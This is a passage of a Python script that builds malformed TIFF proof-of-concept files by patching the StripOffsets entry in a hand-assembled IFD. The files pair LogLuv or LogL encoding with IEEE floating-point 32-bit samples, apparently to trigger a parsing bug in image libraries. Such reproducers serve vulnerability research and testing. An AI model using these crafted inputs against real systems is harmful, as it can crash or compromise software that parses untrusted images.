\n    # Simpler: rebuild but compute strip offset by hardcoding a big IFD offset.\n    # Rebuild with ifd_offset=8 and find strip location via StripByteCounts/tags var.\n    # We'll just recompute via the structure.\n    return rebuild_with_strip_offset(tags, data)\n\ndef rebuild_with_strip_offset(tags, data):\n    # Reserve 1024 bytes for IFD + extra to be safe\n    base = 8\n    ifd_off = base\n    n = len(tags)\n    # compute extra bytes size to place strip after it\n    # call build_tiff once to get total structure length without data, using dummy offset for strip\n    # Patch step: build with strip offset 0, then locate.\n    import copy\n    t2 = copy.deepcopy(tags)\n    blob = build_tiff(t2, strip_data=data)\n    # StripOffsets entry was written as value 0 in data area (LONG). We set 273 to value 0 single LONG.\n    # In build_tiff, tid 273 tcode4 cnt1 -> inline value. Strip data is appended after IFD+extra.\n    # We need to find where strip data starts. Compute: header(8)+ifd(2+12n+4)+extra.\n    # Build again to find length of (ifd+extra) then patch offset.\n    # Compute size by building with empty data and measuring.\n    blob_empty = build_tiff(t2, strip_data=b\"\")\n    body_len = len(blob_empty)  # 8 + ifd + extra, padded to even\n    # Now patch the value of entry 273 (Single LONG) which is at known offset.\n    # entry id 273 offset within IFD: position of 273 in sorted entries *12 + (2 header)\n    sorted_ids = sorted(t2.keys())\n    idx = sorted_ids.index(273)\n    entry_off = 8 + 2 + idx*12 + 4  # value field start (offset 4 within 12-byte entry)\n    out = bytearray(blob_empty) + data\n    struct.pack_into(\"<I\", out, entry_off, body_len)\n    return bytes(out)\n\nif __name__ == \"__main__\":\n    which = sys.argv[1]\n    if which == \"a\":\n        # LOGLUV, NONE, spp2, bps32, IEEEFP\n        oc = make(\"poc_logluv2_ieeefp.tiff\", 32845, 1, 2, 32, 3)\n    elif which == \"b\":\n        # LOGL, NONE, spp2, bps32, IEEEFP\n        oc = make(\"poc_